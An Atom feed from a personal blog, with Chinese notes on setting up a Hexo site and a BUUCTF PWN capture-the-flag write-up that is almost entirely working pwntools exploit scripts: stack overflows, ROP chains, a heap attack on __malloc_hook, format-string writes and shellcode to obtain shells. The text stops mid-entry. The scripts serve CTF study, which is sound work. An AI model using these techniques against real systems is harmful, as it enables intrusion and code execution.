<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jun`s Blog</title>
  <icon>https://www.gravatar.com/avatar/8c76a8aac1474e2dc386f680172f34e7</icon>
  
  <link href="https://adam-01.github.io/atom.xml" rel="self"/>
  
  <link href="https://adam-01.github.io/"/>
  <updated>2021-10-16T08:27:28.632Z</updated>
  <id>https://adam-01.github.io/</id>
  
  <author>
    <name>Jun</name>
    <email>dj1614850528@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>博客搭建笔记</title>
    <link href="https://adam-01.github.io/2021/10/16/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <id>https://adam-01.github.io/2021/10/16/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</id>
    <published>2021-10-16T08:01:16.264Z</published>
    <updated>2021-10-16T08:27:28.632Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ssh-T-git-github-com-报错"><a href="#ssh-T-git-github-com-报错" class="headerlink" title="ssh -T git@github.com 报错"></a>ssh -T <a href="mailto:git@github.com">git@github.com</a> 报错</h3><p><code>git@github.com: Permission denied (publickey).</code></p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global --list</span><br><span class="line">git config --global user.name “yourname”，git config --global user.email “email@email.com”</span><br><span class="line">ssh-keygen -t rsa -C “你的邮箱”</span><br><span class="line">clip &lt; ~&#x2F;.ssh&#x2F;id_rsa.pub #回车后就复制到剪切板了</span><br></pre></td></tr></table></figure><p>到github添加ssh keys的地方直接就能粘贴上</p><p>GitHub—&gt;setting—&gt;SSH and GPG keys—&gt;SSH keys—&gt;new</p><h3 id="使用butterfly主题"><a href="#使用butterfly主题" class="headerlink" title="使用butterfly主题"></a>使用butterfly主题</h3><p><code>git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</code></p><p>更改blog根目录下的_config.yml</p><p>theme: Butterfly</p><p>这个主题不过有点废图， 提供2个自己搜图用的网站</p><p><a href="https://wallroom.io/">https://wallroom.io/</a></p><p><a href="https://www.pexels.com/">https://www.pexels.com/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d </span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>访问报错</p><p><code>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug</code></p><p>百度解决办法失效：</p><p><code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code></p><p>还是报错。。。</p><p>再安装cheerio 成功解决</p><p><code>npm install cheerio --save</code></p><h3 id="文章上传"><a href="#文章上传" class="headerlink" title="文章上传"></a>文章上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  <span class="comment">#清除缓存</span></span><br><span class="line">hexo g <span class="comment">#生成静态文件</span></span><br><span class="line">hexo s <span class="comment">#本地测试</span></span><br><span class="line">hexo d <span class="comment">#上传git</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ssh-T-git-github-com-报错&quot;&gt;&lt;a href=&quot;#ssh-T-git-github-com-报错&quot; class=&quot;headerlink&quot; title=&quot;ssh -T git@github.com 报错&quot;&gt;&lt;/a&gt;ssh -T &lt;a href=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>guestbook</title>
    <link href="https://adam-01.github.io/2020/09/21/guestbook/"/>
    <id>https://adam-01.github.io/2020/09/21/guestbook/</id>
    <published>2020-09-21T07:31:06.000Z</published>
    <updated>2020-09-21T07:31:06.585Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>DJJ</title>
    <link href="https://adam-01.github.io/2020/09/21/DJJ/"/>
    <id>https://adam-01.github.io/2020/09/21/DJJ/</id>
    <published>2020-09-21T07:31:06.000Z</published>
    <updated>2020-09-21T08:50:09.787Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-PWN</title>
    <link href="https://adam-01.github.io/2020/09/21/BUUCTF-PWN/"/>
    <id>https://adam-01.github.io/2020/09/21/BUUCTF-PWN/</id>
    <published>2020-09-21T07:31:06.000Z</published>
    <updated>2020-09-21T08:58:22.690Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BUUCTF-PWN-WP-To-be-continued-…"><a href="#BUUCTF-PWN-WP-To-be-continued-…" class="headerlink" title="BUUCTF-PWN WP To be continued ….."></a>BUUCTF-PWN WP To be continued …..</h3><a id="more"></a><h1 id="NO-00-pwn1-sctf-2016-sovle"><a href="#NO-00-pwn1-sctf-2016-sovle" class="headerlink" title="NO.00 pwn1_sctf_2016_sovle"></a>NO.00 pwn1_sctf_2016_sovle</h1><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28928)</span><br><span class="line"></span><br><span class="line">#print p.recvuntil(&#39;Tell me something about yourself: &#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;I&#39;*0x14 + &#39;a&#39;*4 + p64(0x08048F0D)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-01-warmup-csaw-2016-sovle"><a href="#NO-01-warmup-csaw-2016-sovle" class="headerlink" title="NO.01 warmup_csaw_2016_sovle"></a>NO.01 warmup_csaw_2016_sovle</h1><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io&#x3D;remote(&quot;node2.buuoj.cn.wetolink.com&quot;,28872)</span><br><span class="line">#io&#x3D;process(&quot;.&#x2F;warmup_csaw_2016&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x400713</span><br><span class="line">pop_rsi_r15 &#x3D; 0x400711</span><br><span class="line">bss &#x3D; 0x601058 </span><br><span class="line">gets_addr &#x3D; 0x400500</span><br><span class="line">sys_addr &#x3D; 0x4004d0</span><br><span class="line">print io.recv()</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x40+&#39;a&#39;*8 +p64(pop_rdi) + p64(bss) + p64(gets_addr) + p64(pop_rdi)+p64(bss)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-02-babyheap-0ctf-2017-sovle"><a href="#NO-02-babyheap-0ctf-2017-sovle" class="headerlink" title="NO.02 babyheap_0ctf_2017_sovle"></a>NO.02 babyheap_0ctf_2017_sovle</h1><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39; </span><br><span class="line"></span><br><span class="line">p &#x3D;process(&#39;.&#x2F;babyheap_0ctf_2017&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">#p &#x3D;remote(&#39;node3.buuoj.cn&#39;,26914)</span><br><span class="line"></span><br><span class="line">def Allocate(size):</span><br><span class="line">    p.recvuntil(&quot;Command:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Size:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def Fill(idx,con):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;Size:&quot;)</span><br><span class="line">    p.sendline(str(len(con)))</span><br><span class="line">    p.recvuntil(&quot;Content:&quot;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line">def Free(idx):</span><br><span class="line">    p.recvuntil(&quot;Command:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def Dump(idx):</span><br><span class="line">    p.recvuntil(&quot;Command:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&#39;Content: \n&#39;)</span><br><span class="line">    return p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Allocate(0x60)#idx&#x3D;0</span><br><span class="line">Allocate(0x30)#idx&#x3D;1</span><br><span class="line"></span><br><span class="line">#sleep(1)</span><br><span class="line">Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71))</span><br><span class="line"></span><br><span class="line">Allocate(0x100)#idx&#x3D;2</span><br><span class="line"></span><br><span class="line">Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71))</span><br><span class="line"></span><br><span class="line">Free(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Allocate(0x60)#idx&#x3D;2</span><br><span class="line"></span><br><span class="line">Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))</span><br><span class="line"></span><br><span class="line">Allocate(0x60)</span><br><span class="line"></span><br><span class="line">Free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print Dump(1)</span><br><span class="line">#print hexDump(1)[:-8]</span><br><span class="line">leak &#x3D; u64(Dump(1)[-25:-17])-0x58</span><br><span class="line">print &quot;leak:&quot;+hex(leak)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base&#x3D;leak-0x3c4b20</span><br><span class="line">malloc_hook&#x3D;base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">Free(1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-0x23)+p64(0))</span><br><span class="line"></span><br><span class="line">Allocate(0x60)#idx</span><br><span class="line">Allocate(0x60)#idx</span><br><span class="line">Fill(2,&quot;a&quot;*3+p64(0)+p64(0)+p64(base+0x4526a))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">Allocate(0x100)#idx4</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-03-babyfengshui-sovle"><a href="#NO-03-babyfengshui-sovle" class="headerlink" title="NO.03 babyfengshui_sovle"></a>NO.03 babyfengshui_sovle</h1><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p&#x3D;remote(&#39;111.198.29.45&#39;,35423)</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26557)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyfengshui&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;libc.so.6&#39;)</span><br><span class="line">obj&#x3D;LibcSearcher(&#39;free&#39;,0xf7659750)</span><br><span class="line">def add_note(size,length,text):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;0&#39;)</span><br><span class="line">    p.recvuntil(&#39;size of description: &#39;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&#39;name: &#39;)</span><br><span class="line">    p.sendline(&#39;AAA&#39;)</span><br><span class="line">    p.recvuntil(&#39;text length: &#39;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#39;text: &#39;)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">def delete_note(idx):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;index: &#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def display_note(idx):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.recvuntil(&#39;index: &#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def update_note(idx,length,text):</span><br><span class="line">    p.recvuntil(&#39;Action: &#39;)</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.recvuntil(&#39;index: &#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&#39;text length: &#39;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.sendlineafter(&#39;text: &#39;,text)</span><br><span class="line"></span><br><span class="line">add_note(0x80,0x80,&#39;abcd&#39;)</span><br><span class="line">add_note(0x80,0x80,&#39;efgh&#39;)</span><br><span class="line">add_note(0x8,0x8,&#39;&#x2F;bin&#x2F;sh\00&#39;)</span><br><span class="line"></span><br><span class="line">delete_note(0)</span><br><span class="line"></span><br><span class="line">add_note(0x100,0x19c,&#39;a&#39;*0x198 + p32(elf.got[&#39;free&#39;]))</span><br><span class="line">display_note(1)</span><br><span class="line">p.recvuntil(&#39;description: &#39;)</span><br><span class="line">free_addr&#x3D;u32(p.recv(4))</span><br><span class="line">print hex(free_addr)</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; free_addr - (obj.dump(&#39;free&#39;) - obj.dump(&#39;system&#39;))</span><br><span class="line">log.info(&quot;system_addr 0x%x&quot; % system_addr)</span><br><span class="line">update_note(1,0x4,p32(system_addr))</span><br><span class="line"></span><br><span class="line">delete_note(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-04-第五空间2019决赛-PWN5-sovle"><a href="#NO-04-第五空间2019决赛-PWN5-sovle" class="headerlink" title="NO.04 第五空间2019决赛_PWN5_sovle"></a>NO.04 第五空间2019决赛_PWN5_sovle</h1><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;第五空间2019 决赛]PWN5&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27557)</span><br><span class="line">elf &#x3D; ELF(&#39;第五空间2019 决赛]PWN5&#39;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 10</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#这个方法是将atoi改为system,输入密码时直接传入&#x2F;bin&#x2F;sh，if语句中直接得到shell.</span><br><span class="line">system_addr &#x3D; 0x08049080</span><br><span class="line">aoti_addr &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">p.recvuntil(&#39;your name:&#39;)</span><br><span class="line">payload &#x3D; fmtstr_payload(offset,&#123;aoti_addr:system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;your passwd:&#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">p.interactive()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">addr&#x3D;0x0804C044 #unk_804C044_addr</span><br><span class="line"></span><br><span class="line">payload&#x3D;p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">payload+&#x3D;&#39;%10$hhn%11$hhn%12$hhn%13$hhn&#39;</span><br><span class="line"># %10$hhn表示向偏移为10处写入的地址空间为1字节</span><br><span class="line"># %$hn表示写入的地址空间为2字节</span><br><span class="line"># %$lln表示写入的地址空间为8字节 </span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;your name:&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;your passwd:&#39;)</span><br><span class="line">p.sendline(str(0x10101010)) </span><br><span class="line">#这里的四个0x10是表示payloa中四个地址的数据长度,32位一个地址占4字节</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-05-get-started-3dsctf-2016-sovle"><a href="#NO-05-get-started-3dsctf-2016-sovle" class="headerlink" title="NO.05 get_started_3dsctf_2016_sovle"></a>NO.05 get_started_3dsctf_2016_sovle</h1><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;get_started_3dsctf_2016&quot;)</span><br><span class="line">sh &#x3D;  remote(&#39;node3.buuoj.cn&#39;,27290)</span><br><span class="line">elf &#x3D; ELF(&quot;get_started_3dsctf_2016&quot;)</span><br><span class="line">pop2_ret &#x3D; 0x0809a7dc</span><br><span class="line">pop3_ret &#x3D; 0x0804f460</span><br><span class="line">payload &#x3D; &#39;a&#39; * 56 + p32(elf.symbols[&#39;mprotect&#39;]) + p32(pop3_ret) + p32(0x080EB000) + p32(0x3000) + p32(7) + p32(elf.symbols[&#39;read&#39;]) + p32(pop3_ret) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#sleep(1)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-06-not-the-same-3dsctf-2016-sovle"><a href="#NO-06-not-the-same-3dsctf-2016-sovle" class="headerlink" title="NO.06 not_the_same_3dsctf_2016_sovle"></a>NO.06 not_the_same_3dsctf_2016_sovle</h1><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;not_the_same_3dsctf_2016&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26723)</span><br><span class="line">elf &#x3D; ELF(&#39;not_the_same_3dsctf_2016&#39;)</span><br><span class="line">offset &#x3D; 0x2d</span><br><span class="line">ppp &#x3D; 0x0809e3e5</span><br><span class="line">bss &#x3D; 0x080EC624</span><br><span class="line">pit_got &#x3D; 0x080EB000</span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(elf.symbols[&#39;mprotect&#39;])</span><br><span class="line">payload +&#x3D; p32(ppp) + p32(pit_got) + p32(0x1001)+ p32(7) + p32(elf.symbols[&#39;read&#39;])</span><br><span class="line">payload +&#x3D; p32(ppp) + p32(0) + p32(bss) + p32(0x1000) + p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#本地可行</span><br><span class="line">offset &#x3D; 0x2d</span><br><span class="line">get_secret &#x3D; 0x080489A0</span><br><span class="line">fl4g &#x3D; 0x080ECA2D</span><br><span class="line">printf &#x3D; 0x0804F0A0</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(get_secret)</span><br><span class="line">payload +&#x3D; p32(printf)+p32(1) + p32(fl4g)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><h1 id="NO-07-ciscn-2019-n-8-sovle"><a href="#NO-07-ciscn-2019-n-8-sovle" class="headerlink" title="NO.07 ciscn_2019_n_8_sovle"></a>NO.07 ciscn_2019_n_8_sovle</h1><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_8&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26718)</span><br><span class="line">p.recv()</span><br><span class="line">payload &#x3D; &#39;\x11&#39;*53</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-08-pwn2sovle"><a href="#NO-08-pwn2sovle" class="headerlink" title="NO.08 pwn2sovle"></a>NO.08 pwn2sovle</h1><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 